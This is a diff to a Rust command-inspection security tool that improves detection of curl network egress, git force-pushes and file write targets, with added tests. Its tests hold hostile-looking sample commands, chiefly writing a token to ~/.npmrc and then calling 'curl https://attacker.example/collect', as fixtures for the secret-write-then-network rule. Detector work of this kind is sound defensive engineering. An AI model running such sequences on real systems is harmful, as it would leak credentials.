@@ -1205,12 +1205,43 @@ fn network_invocation_has_remote_target(leader_base: &str, args: &[String]) -> b
     // default covering only the flags common across downloaders.
     let value_flags: &[&str] = value_flags_for(leader_base);
     let mut skip_next = false;
+    // The token that follows a bare `--url`/`-url` (curl): its VALUE is the remote
+    // target itself, not a path/cert to ignore, so it must be host-checked, not
+    // skipped. Set when the previous token was a bare url flag.
+    let mut url_value_next = false;
     for a in args {
+        if url_value_next {
+            url_value_next = false;
+            // The value of `--url` is the request URL; classify it exactly like a
+            // positional target below (scheme URL or bare host).
+            if token_is_remote_target(a) {
+                return true;
+            }
+            continue;
+        }
         if skip_next {
             skip_next = false;
             continue;
         }
         if a.starts_with('-') {
+            // curl's `--url <URL>` names the request target explicitly. The bare
+            // form puts the URL in the NEXT token (host-check it on the next pass);
+            // the attached `--url=<URL>` form carries the URL inside this token, so
+            // extract and host-check it here. Both forms must record a Network
+            // event for a remote target (detection-evasion otherwise), so neither
+            // is discarded by the generic leading-`-` skip below.
+            if leader_base == "curl" {
+                if a == "--url" {
+                    url_value_next = true;
+                    continue;
+                }
+                if let Some(rest) = a.strip_prefix("--url=") {
+                    if token_is_remote_target(rest) {
+                        return true;
+                    }
+                    continue;
+                }
+            }
             // A bare value-taking flag consumes the next token as its value; the
             // `--flag=value` form is self-contained and consumes nothing extra.
             if value_flags.contains(&a.as_str()) {
@@ -1218,43 +1249,45 @@ fn network_invocation_has_remote_target(leader_base: &str, args: &[String]) -> b
             }
             continue;
         }
-        // A scheme URL is a remote target ONLY when it points at a real remote
-        // host. `file://...` is not a network fetch at all, and a loopback/local
-        // host (`http://localhost`, `http://127.0.0.1`, `http://[::1]`,
-        // `https://localhost:8080`) never leaves the machine, so neither should
-        // record a Network egress (which could otherwise feed a false W7
-        // correlation). A genuine remote host still counts.
-        if let Some((scheme, host)) = scheme_and_host(a) {
-            if scheme == "file" {
-                continue;
-            }
-            if is_remote_url_host(host) {
-                return true;
-            }
-            continue;
-        }
-        // A bare host-like positional (`example.com`, `example.com/x`): the part
-        // before any path component must contain a dot and look like a hostname.
-        // A loopback literal (`127.0.0.1/x`) is excluded for the same reason as the
-        // scheme case above.
-        let host_part = a.split('/').next().unwrap_or(a);
-        if host_part.contains('.')
-            && !host_part.starts_with('.')
-            && !host_part.contains(' ')
-            && host_part
-                .chars()
-                .all(|c| c.is_ascii_alphanumeric() || c == '.' || c == '-' || c == ':')
-            && is_remote_url_host(host_part)
-        {
+        if token_is_remote_target(a) {
             return true;
         }
     }
     false
 }
 
+/// True when a bare token names an ACTUAL remote target: a scheme URL whose host
+/// is remote (`https://example.com/x`), or a host-like positional whose authority
+/// looks like a real hostname (`example.com/x`). `file://...` URLs and
+/// loopback/local hosts (`http://localhost`, `127.0.0.1/x`) are NOT remote, so
+/// they never record a Network egress (which could otherwise feed a false W7
+/// correlation). String-only: it does NOT resolve DNS or decide reachability.
+fn token_is_remote_target(a: &str) -> bool {
+    // A scheme URL is a remote target ONLY when it points at a real remote host.
+    if let Some((scheme, host)) = scheme_and_host(a) {
+        if scheme == "file" {
+            return false;
+        }
+        return is_remote_url_host(host);
+    }
+    // A bare host-like positional (`example.com`, `example.com/x`): the part
+    // before any path component must contain a dot and look like a hostname.
+    let host_part = a.split('/').next().unwrap_or(a);
+    host_part.contains('.')
+        && !host_part.starts_with('.')
+        && !host_part.contains(' ')
+        && host_part
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || c == '.' || c == '-' || c == ':')
+        && is_remote_url_host(host_part)
+}
+
 /// True if `args` (the args AFTER `git`) describe a force-push: the git
-/// SUBCOMMAND is `push` AND a force flag (`--force`, `-f`, `--force-with-lease`)
-/// is present AFTER the subcommand. The subcommand is the first token that is
+/// SUBCOMMAND is `push` AND a force form is present AFTER the subcommand. A force
+/// form is a force flag (`--force`, `-f`, `--force-with-lease`), the `--mirror`
+/// flag (force-updates every remote ref), or a positional refspec opening with
+/// `+` (`git push origin +main`, a per-ref force). The subcommand is the first
+/// token that is
 /// neither a global option nor a global option's value, so a `-f` belonging to a
 /// different subcommand (e.g. `git tag -f push`) does NOT count: there the
 /// subcommand is `tag`, not `push`. Global options before the subcommand
@@ -1278,6 +1311,14 @@ fn git_is_force_push(args: &[String]) -> bool {
             || a == "-f"
             || a == "--force-with-lease"
             || a.starts_with("--force-with-lease=")
+            // `--mirror` force-updates (and deletes) all remote refs to match local.
+            || a == "--mirror"
+            // A positional refspec with a leading `+` force-updates that ref
+            // (`git push origin +main`), equivalent to `--force` for that ref.
+            // Refspecs are positionals, never options, so a `+` opening an option
+            // value (`--push-option=+x` starts with `-`) cannot reach this. A bare
+            // `+` alone is not a refspec, so require more than just `+`.
+            || (a.starts_with('+') && a.len() > 1)
     })
 }
 
@@ -1420,9 +1461,16 @@ fn output_target_glued_prefixes(leader_base: &str) -> &'static [&'static str] {
 /// `cp -t DIR a b` writes `DIR/a` and `DIR/b`, so several can be returned.
 /// Conservative best-effort token scan.
 fn write_targets(seg: &tokenize::Segment, leader_base: &str, args: &[String]) -> Vec<String> {
+    // Accumulate EVERY write target rather than returning on the first. A single
+    // command can both fetch and write a secret: `curl https://x -o .env > /tmp/log`
+    // has a benign redirection (`/tmp/log`) AND a `-o .env` SecretWrite. Returning
+    // on the redirect alone would drop the `.env` write and the W7
+    // SecretWrite-then-Network correlation, so every form below pushes into `out`.
+    let mut out: Vec<String> = Vec::new();
+
     // 1) Shell redirection target anywhere in the raw segment: `> ~/.npmrc`.
     if let Some(path) = redirection_target(&seg.raw) {
-        return vec![path];
+        out.push(path);
     }
 
     // 2) Downloader output flag: `curl -o .env`, `wget -O id_rsa`. The flag set is
@@ -1438,7 +1486,9 @@ fn write_targets(seg: &tokenize::Segment, leader_base: &str, args: &[String]) ->
         let mut want_value = false;
         for a in args {
             if want_value {
-                return vec![a.clone()];
+                want_value = false;
+                out.push(a.clone());
+                continue;
             }
             if value_flags.contains(&a.as_str()) {
                 want_value = true;
@@ -1451,7 +1501,7 @@ fn write_targets(seg: &tokenize::Segment, leader_base: &str, args: &[String]) ->
             for prefix in attached {
                 if let Some(rest) = a.strip_prefix(prefix) {
                     if !rest.is_empty() {
-                        return vec![rest.to_string()];
+                        out.push(rest.to_string());
                     }
                 }
             }
@@ -1465,7 +1515,7 @@ fn write_targets(seg: &tokenize::Segment, leader_base: &str, args: &[String]) ->
             for prefix in glued {
                 if let Some(rest) = a.strip_prefix(prefix) {
                     if !rest.is_empty() {
-                        return vec![rest.to_string()];
+                        out.push(rest.to_string());
                     }
                 }
             }
@@ -1486,21 +1536,20 @@ fn write_targets(seg: &tokenize::Segment, leader_base: &str, args: &[String]) ->
             // the source basename onto the dir recovers the real target (so
             // `cp -t /backups package.json` correctly flags `/backups/package.json`).
             if let Some(dir) = cp_target_directory(args) {
-                return cp_target_directory_writes(&dir, args);
-            }
-            if let Some(dest) = args.iter().rev().find(|a| !a.starts_with('-')) {
-                return vec![dest.clone()];
+                out.extend(cp_target_directory_writes(&dir, args));
+            } else if let Some(dest) = args.iter().rev().find(|a| !a.starts_with('-')) {
+                out.push(dest.clone());
             }
         }
         "tee" => {
             if let Some(p) = args.iter().find(|a| !a.starts_with('-')) {
-                return vec![p.clone()];
+                out.push(p.clone());
             }
         }
         _ => {}
     }
 
-    Vec::new()
+    out
 }
 
 /// Compute the per-source write targets for a `cp -t DIR a b ...` (or mv/install)
@@ -1588,17 +1637,38 @@ fn path_is_manifest(path: &str) -> bool {
 
 /// Find a `> path` / `>> path` redirection target in raw segment text and return
 /// the path (unclassified). Tokenizes on whitespace and looks for a `>`/`>>`
-/// token (or a `>`-prefixed token) followed by a path.
+/// token (or a `>`-prefixed token) followed by a path. Also handles a file
+/// descriptor prefix immediately before the operator (`1>.env`, `2>package.json`,
+/// `1> .env`): a single leading digit 0-9 designates the redirected fd and does
+/// not change that the FOLLOWING text is the write target.
 fn redirection_target(raw: &str) -> Option<String> {
+    /// Strip a single optional leading fd digit (0-9) from a redirection token, so
+    /// `1>` / `2>>` / `1>.env` are normalised to `>` / `>>` / `>.env`. POSIX allows
+    /// multi-digit fds, but a single digit covers the practical stdout/stderr
+    /// (`1`/`2`) cases without misreading an ordinary `9foo` argument.
+    fn strip_fd_prefix(tok: &str) -> &str {
+        let mut chars = tok.char_indices();
+        if let Some((_, first)) = chars.next() {
+            if first.is_ascii_digit() {
+                if let Some((idx, second)) = chars.next() {
+                    if second == '>' {
+                        return &tok[idx..];
+                    }
+                }
+            }
+        }
+        tok
+    }
     let toks: Vec<&str> = raw.split_whitespace().collect();
-    for (i, tok) in toks.iter().enumerate() {
-        // `> path` or `>> path` (separated).
-        if (*tok == ">" || *tok == ">>") || tok.ends_with('>') && tok.chars().all(|c| c == '>') {
+    for (i, raw_tok) in toks.iter().enumerate() {
+        let tok = strip_fd_prefix(raw_tok);
+        // `> path` or `>> path` (separated), with optional fd prefix (`1> path`).
+        if (tok == ">" || tok == ">>") || (tok.ends_with('>') && tok.chars().all(|c| c == '>')) {
             if let Some(next) = toks.get(i + 1) {
                 return Some((*next).to_string());
             }
         }
-        // `>path` / `>>path` (attached).
+        // `>path` / `>>path` (attached), with optional fd prefix (`1>path`).
         if let Some(rest) = tok.strip_prefix(">>").or_else(|| tok.strip_prefix('>')) {
             if !rest.is_empty() {
                 return Some(rest.to_string());
@@ -2967,6 +3037,30 @@ mod tests {
     }
 
     #[test]
+    fn derive_git_force_push_refspec_plus_and_mirror() {
+        // A leading `+` on a positional refspec (`git push origin +main`) and the
+        // `--mirror` flag both force-update remote refs, so both must synthesize a
+        // GitForcePush even without an explicit `--force`/`-f`/`--force-with-lease`.
+        let v = raw_verdict_with(Action::Allow, vec![], None);
+        assert!(
+            kinds(&derive_typed_events("git push origin +main", &v))
+                .contains(&EventKind::GitForcePush),
+            "`git push origin +main` is a force-push (refspec `+` prefix)"
+        );
+        assert!(
+            kinds(&derive_typed_events("git push --mirror origin", &v))
+                .contains(&EventKind::GitForcePush),
+            "`git push --mirror origin` is a force-push"
+        );
+        // A plain push without `+`/`--mirror`/force flags is NOT a force-push.
+        assert!(
+            !kinds(&derive_typed_events("git push origin main", &v))
+                .contains(&EventKind::GitForcePush),
+            "`git push origin main` is not a force-push"
+        );
+    }
+
+    #[test]
     fn derive_git_force_push_skips_value_taking_globals() {
         // F7: value-taking git globals (`--git-dir`, `--work-tree`, `--namespace`)
         // consume a SEPARATE following token. If that token were misread as the
@@ -3067,6 +3161,81 @@ mod tests {
                 .contains(&EventKind::Network),
             "`wget example.com/install.sh` must record a Network event"
         );
+    }
+
+    #[test]
+    fn derive_network_from_curl_url_flag_forms() {
+        // curl `--url <URL>` (separated) and `--url=<URL>` (attached) both name the
+        // request target explicitly. The attached form is a single `-`-leading token
+        // that the generic flag skip would otherwise discard, dropping the Network
+        // event (detection-evasion). Both forms must record Network for a remote host.
+        let v = raw_verdict_with(Action::Allow, vec![], None);
+        assert!(
+            kinds(&derive_typed_events("curl --url https://example.com/x", &v))
+                .contains(&EventKind::Network),
+            "`curl --url https://example.com/x` (separated) must record Network"
+        );
+        assert!(
+            kinds(&derive_typed_events("curl --url=https://example.com/x", &v))
+                .contains(&EventKind::Network),
+            "`curl --url=https://example.com/x` (attached) must record Network"
+        );
+        // A local/loopback `--url` target is still not a remote egress.
+        assert!(
+            !kinds(&derive_typed_events("curl --url=http://127.0.0.1/x", &v))
+                .contains(&EventKind::Network),
+            "`curl --url=http://127.0.0.1/x` targets loopback, no Network event"
+        );
+        // Unit-level: the helper recognizes both forms for curl.
+        assert!(network_invocation_has_remote_target(
+            "curl",
+            &["--url".into(), "https://example.com/x".into()]
+        ));
+        assert!(network_invocation_has_remote_target(
+            "curl",
+            &["--url=https://example.com/x".into()]
+        ));
+    }
+
+    #[test]
+    fn derive_write_targets_accumulate_redirect_and_output() {
+        // A command with BOTH a (benign) shell redirection and a downloader `-o`
+        // secret output must record BOTH the Network egress AND the `.env`
+        // SecretWrite. Short-circuiting on the redirection alone would drop the
+        // SecretWrite and the W7 SecretWrite-then-Network correlation.
+        let v = raw_verdict_with(Action::Allow, vec![], None);
+        let events = derive_typed_events("curl https://x.example/k -o .env > /tmp/log", &v);
+        let ks = kinds(&events);
+        assert!(
+            ks.contains(&EventKind::Network),
+            "redirect + `-o .env` must still record Network: {ks:?}"
+        );
+        let secret = events
+            .iter()
+            .find(|e| e.kind == EventKind::SecretWrite)
+            .expect("`-o .env` SecretWrite must survive the redirection short-circuit");
+        assert_eq!(
+            secret.metadata.get("path").map(String::as_str),
+            Some(".env"),
+            "the `-o` secret target path must be captured, not the redirect path"
+        );
+    }
+
+    #[test]
+    fn redirection_target_handles_fd_prefix() {
+        // POSIX fd-prefixed redirections (`1>.env`, `2>package.json`, `1> .env`)
+        // designate a redirected fd but still write the FOLLOWING text. Each must be
+        // recognized as the write target, glued and separated.
+        assert_eq!(redirection_target("printf x 1>.env"), Some(".env".into()));
+        assert_eq!(
+            redirection_target("printf x 2>package.json"),
+            Some("package.json".into())
+        );
+        assert_eq!(redirection_target("printf x 1> .env"), Some(".env".into()));
+        // Plain forms still work, and a non-redirection token is not a target.
+        assert_eq!(redirection_target("printf x > .env"), Some(".env".into()));
+        assert_eq!(redirection_target("printf x >> .env"), Some(".env".into()));
+        assert_eq!(redirection_target("printf x .env"), None);
     }
 
     #[test]
@@ -3366,6 +3535,36 @@ mod tests {
         );
     }
 
+    /// RAII guard that snapshots an env var on construction and restores it (to its
+    /// prior value, or absent) on Drop, so a unix E2E test that sets
+    /// `XDG_STATE_HOME`/`TIRITH_LOG` does not leak that mutation into later tests.
+    /// Mirrors the `EnvVarGuard` used in `policy.rs`/`url_validate.rs`. Restoration
+    /// runs on unwind too, so the previous `catch_unwind` + unconditional
+    /// `remove_var` dance is no longer needed. Serialized by `TEST_ENV_LOCK`.
+    struct EnvVarGuard {
+        key: &'static str,
+        prev: Option<std::ffi::OsString>,
+    }
+
+    impl EnvVarGuard {
+        fn set(key: &'static str, value: impl AsRef<std::ffi::OsStr>) -> Self {
+            let prev = std::env::var_os(key);
+            // SAFETY: serialized by TEST_ENV_LOCK across all modules.
+            unsafe { std::env::set_var(key, value) };
+            Self { key, prev }
+        }
+    }
+
+    impl Drop for EnvVarGuard {
+        fn drop(&mut self) {
+            // SAFETY: serialized by TEST_ENV_LOCK; restore the prior value or remove.
+            match &self.prev {
+                Some(v) => unsafe { std::env::set_var(self.key, v) },
+                None => unsafe { std::env::remove_var(self.key) },
+            }
+        }
+    }
+
     /// W7 end-to-end: a SINGLE `rm a b c d` (four non-artifact paths) trips the
     /// MassFileDeletion correlation through the real `post_process_verdict` path,
     /// while `rm dist/x dist/y dist/z` (build artifacts) does not. This is the
@@ -3378,78 +3577,65 @@ mod tests {
             .lock()
             .unwrap_or_else(|e| e.into_inner());
         let dir = tempfile::tempdir().unwrap();
-        // SAFETY: serialized by TEST_ENV_LOCK across all modules.
-        unsafe {
-            std::env::set_var("XDG_STATE_HOME", dir.path());
-            std::env::set_var("TIRITH_LOG", "0");
-        }
+        // Snapshot-and-restore the prior env so later tests are not mutated.
+        let _xdg = EnvVarGuard::set("XDG_STATE_HOME", dir.path());
+        let _log = EnvVarGuard::set("TIRITH_LOG", "0");
 
-        let result = std::panic::catch_unwind(|| {
-            let policy = crate::policy::Policy::default();
+        let policy = crate::policy::Policy::default();
 
-            // Four real paths in one command -> MassFileDeletion fires.
-            let v = raw_verdict_with(Action::Allow, vec![], None);
-            let out = post_process_verdict(
-                &v,
-                &policy,
-                "rm a b c d",
-                "w7-mass-delete-multipath",
-                CallerContext::Cli,
-            );
-            assert!(
-                out.findings
-                    .iter()
-                    .any(|f| f.rule_id == RuleId::MassFileDeletion),
-                "a single rm of 4 paths must trip MassFileDeletion: {:?}",
-                out.findings.iter().map(|f| f.rule_id).collect::<Vec<_>>()
-            );
+        // Four real paths in one command -> MassFileDeletion fires.
+        let v = raw_verdict_with(Action::Allow, vec![], None);
+        let out = post_process_verdict(
+            &v,
+            &policy,
+            "rm a b c d",
+            "w7-mass-delete-multipath",
+            CallerContext::Cli,
+        );
+        assert!(
+            out.findings
+                .iter()
+                .any(|f| f.rule_id == RuleId::MassFileDeletion),
+            "a single rm of 4 paths must trip MassFileDeletion: {:?}",
+            out.findings.iter().map(|f| f.rule_id).collect::<Vec<_>>()
+        );
 
-            // Build-artifact paths in one command -> excluded, does not fire.
-            let v2 = raw_verdict_with(Action::Allow, vec![], None);
-            let out2 = post_process_verdict(
-                &v2,
-                &policy,
-                "rm dist/x dist/y dist/z",
-                "w7-mass-delete-artifacts",
-                CallerContext::Cli,
-            );
-            assert!(
-                !out2
-                    .findings
-                    .iter()
-                    .any(|f| f.rule_id == RuleId::MassFileDeletion),
-                "a multi-path delete of build artifacts must NOT trip MassFileDeletion"
-            );
+        // Build-artifact paths in one command -> excluded, does not fire.
+        let v2 = raw_verdict_with(Action::Allow, vec![], None);
+        let out2 = post_process_verdict(
+            &v2,
+            &policy,
+            "rm dist/x dist/y dist/z",
+            "w7-mass-delete-artifacts",
+            CallerContext::Cli,
+        );
+        assert!(
+            !out2
+                .findings
+                .iter()
+                .any(|f| f.rule_id == RuleId::MassFileDeletion),
+            "a multi-path delete of build artifacts must NOT trip MassFileDeletion"
+        );
 
-            // A7: a MIXED delete (`rm app.rs dist/a dist/b`) has only ONE non-build
-            // path, so it must NOT trip on its own even though it targets 3 paths.
-            // The single representative path no longer decides for the whole batch.
-            let v3 = raw_verdict_with(Action::Allow, vec![], None);
-            let out3 = post_process_verdict(
-                &v3,
-                &policy,
-                "rm app.rs dist/a dist/b",
-                "w7-mass-delete-mixed",
-                CallerContext::Cli,
-            );
-            assert!(
-                !out3
-                    .findings
-                    .iter()
-                    .any(|f| f.rule_id == RuleId::MassFileDeletion),
-                "a mixed delete with one non-build path must NOT trip MassFileDeletion: {:?}",
-                out3.findings.iter().map(|f| f.rule_id).collect::<Vec<_>>()
-            );
-        });
-
-        // SAFETY: serialized by TEST_ENV_LOCK; restore regardless of outcome.
-        unsafe {
-            std::env::remove_var("XDG_STATE_HOME");
-            std::env::remove_var("TIRITH_LOG");
-        }
-        if let Err(e) = result {
-            std::panic::resume_unwind(e);
-        }
+        // A7: a MIXED delete (`rm app.rs dist/a dist/b`) has only ONE non-build
+        // path, so it must NOT trip on its own even though it targets 3 paths.
+        // The single representative path no longer decides for the whole batch.
+        let v3 = raw_verdict_with(Action::Allow, vec![], None);
+        let out3 = post_process_verdict(
+            &v3,
+            &policy,
+            "rm app.rs dist/a dist/b",
+            "w7-mass-delete-mixed",
+            CallerContext::Cli,
+        );
+        assert!(
+            !out3
+                .findings
+                .iter()
+                .any(|f| f.rule_id == RuleId::MassFileDeletion),
+            "a mixed delete with one non-build path must NOT trip MassFileDeletion: {:?}",
+            out3.findings.iter().map(|f| f.rule_id).collect::<Vec<_>>()
+        );
     }
 
     #[test]
@@ -3480,112 +3666,99 @@ mod tests {
             .lock()
             .unwrap_or_else(|e| e.into_inner());
         let dir = tempfile::tempdir().unwrap();
-        // SAFETY: serialized by TEST_ENV_LOCK across all modules.
-        unsafe {
-            std::env::set_var("XDG_STATE_HOME", dir.path());
-            std::env::set_var("TIRITH_LOG", "0");
-        }
+        // Snapshot-and-restore the prior env so later tests are not mutated.
+        let _xdg = EnvVarGuard::set("XDG_STATE_HOME", dir.path());
+        let _log = EnvVarGuard::set("TIRITH_LOG", "0");
 
-        let result = std::panic::catch_unwind(|| {
-            let policy = crate::policy::Policy::default();
-            let session_id = "w7-secret-then-network";
+        let policy = crate::policy::Policy::default();
+        let session_id = "w7-secret-then-network";
 
-            // Command 1: write a secret file (no findings needed; the deriver
-            // records a SecretWrite from the redirection target).
-            let v1 = raw_verdict_with(Action::Allow, vec![], None);
-            let out1 = post_process_verdict(
-                &v1,
-                &policy,
-                "printf 'TOKEN=x' > ~/.npmrc",
-                session_id,
-                CallerContext::Cli,
-            );
-            // The secret write alone produces no correlation yet.
-            assert!(
-                !out1
-                    .findings
-                    .iter()
-                    .any(|f| f.rule_id == RuleId::SecretWriteThenNetwork),
-                "no correlation should fire on the first command alone"
-            );
+        // Command 1: write a secret file (no findings needed; the deriver
+        // records a SecretWrite from the redirection target).
+        let v1 = raw_verdict_with(Action::Allow, vec![], None);
+        let out1 = post_process_verdict(
+            &v1,
+            &policy,
+            "printf 'TOKEN=x' > ~/.npmrc",
+            session_id,
+            CallerContext::Cli,
+        );
+        // The secret write alone produces no correlation yet.
+        assert!(
+            !out1
+                .findings
+                .iter()
+                .any(|f| f.rule_id == RuleId::SecretWriteThenNetwork),
+            "no correlation should fire on the first command alone"
+        );
 
-            // Ensure a strictly-later instant so the network event is "after" the
-            // secret write (the correlation uses a strict `>` boundary).
-            std::thread::sleep(std::time::Duration::from_millis(5));
+        // Ensure a strictly-later instant so the network event is "after" the
+        // secret write (the correlation uses a strict `>` boundary).
+        std::thread::sleep(std::time::Duration::from_millis(5));
 
-            // Command 2: a network egress within the 30s window.
-            let v2 = raw_verdict_with(Action::Allow, vec![], None);
-            let out2 = post_process_verdict(
-                &v2,
-                &policy,
-                "curl https://attacker.example/collect",
-                session_id,
-                CallerContext::Cli,
-            );
+        // Command 2: a network egress within the 30s window.
+        let v2 = raw_verdict_with(Action::Allow, vec![], None);
+        let out2 = post_process_verdict(
+            &v2,
+            &policy,
+            "curl https://attacker.example/collect",
+            session_id,
+            CallerContext::Cli,
+        );
 
-            // The correlation finding must now be present AND have escalated the
-            // verdict to Block (it is Critical).
-            assert!(
-                out2.findings
-                    .iter()
-                    .any(|f| f.rule_id == RuleId::SecretWriteThenNetwork),
-                "SecretWriteThenNetwork must reach the final verdict: {:?}",
-                out2.findings.iter().map(|f| f.rule_id).collect::<Vec<_>>()
-            );
-            assert_eq!(
-                out2.action,
-                Action::Block,
-                "a Critical correlation must escalate the action to Block"
-            );
+        // The correlation finding must now be present AND have escalated the
+        // verdict to Block (it is Critical).
+        assert!(
+            out2.findings
+                .iter()
+                .any(|f| f.rule_id == RuleId::SecretWriteThenNetwork),
+            "SecretWriteThenNetwork must reach the final verdict: {:?}",
+            out2.findings.iter().map(|f| f.rule_id).collect::<Vec<_>>()
+        );
+        assert_eq!(
+            out2.action,
+            Action::Block,
+            "a Critical correlation must escalate the action to Block"
+        );
 
-            // The correlation hit must be PERSISTED to the session (not just
-            // returned in the verdict): `record_outcome` ran before the W7 block,
-            // so the correlation is recorded in a dedicated second pass. Without
-            // it `tirith warnings` and repeat-count logic would miss this hit.
-            let session = crate::session_warnings::load(session_id);
-            assert!(
-                session
-                    .events
-                    .iter()
-                    .any(|e| e.rule_id == RuleId::SecretWriteThenNetwork.to_string()),
-                "the surfaced correlation must be persisted as a session warning event: {:?}",
-                session
-                    .events
-                    .iter()
-                    .map(|e| &e.rule_id)
-                    .collect::<Vec<_>>()
-            );
+        // The correlation hit must be PERSISTED to the session (not just
+        // returned in the verdict): `record_outcome` ran before the W7 block,
+        // so the correlation is recorded in a dedicated second pass. Without
+        // it `tirith warnings` and repeat-count logic would miss this hit.
+        let session = crate::session_warnings::load(session_id);
+        assert!(
+            session
+                .events
+                .iter()
+                .any(|e| e.rule_id == RuleId::SecretWriteThenNetwork.to_string()),
+            "the surfaced correlation must be persisted as a session warning event: {:?}",
+            session
+                .events
+                .iter()
+                .map(|e| &e.rule_id)
+                .collect::<Vec<_>>()
+        );
 
-            // Dedup: a THIRD command that ALSO records a network event (so
-            // correlation runs again) must NOT re-emit the same hit. The
-            // `secret_then_network` pair resolves to the earliest secret + the
-            // FIRST following network (command 2's), so its signature is
-            // unchanged and the surfaced-marker filters it out.
-            std::thread::sleep(std::time::Duration::from_millis(5));
-            let v3 = raw_verdict_with(Action::Allow, vec![], None);
-            let out3 = post_process_verdict(
-                &v3,
-                &policy,
-                "curl https://other.example/ping",
-                session_id,
-                CallerContext::Cli,
-            );
-            assert!(
-                !out3
-                    .findings
-                    .iter()
-                    .any(|f| f.rule_id == RuleId::SecretWriteThenNetwork),
-                "an already-surfaced correlation must not re-emit on a later command"
-            );
-        });
-
-        // SAFETY: serialized by TEST_ENV_LOCK; restore regardless of outcome.
-        unsafe {
-            std::env::remove_var("XDG_STATE_HOME");
-            std::env::remove_var("TIRITH_LOG");
-        }
-        if let Err(e) = result {
-            std::panic::resume_unwind(e);
-        }
+        // Dedup: a THIRD command that ALSO records a network event (so
+        // correlation runs again) must NOT re-emit the same hit. The
+        // `secret_then_network` pair resolves to the earliest secret + the
+        // FIRST following network (command 2's), so its signature is
+        // unchanged and the surfaced-marker filters it out.
+        std::thread::sleep(std::time::Duration::from_millis(5));
+        let v3 = raw_verdict_with(Action::Allow, vec![], None);
+        let out3 = post_process_verdict(
+            &v3,
+            &policy,
+            "curl https://other.example/ping",
+            session_id,
+            CallerContext::Cli,
+        );
+        assert!(
+            !out3
+                .findings
+                .iter()
+                .any(|f| f.rule_id == RuleId::SecretWriteThenNetwork),
+            "an already-surfaced correlation must not re-emit on a later command"
+        );
     }
 }
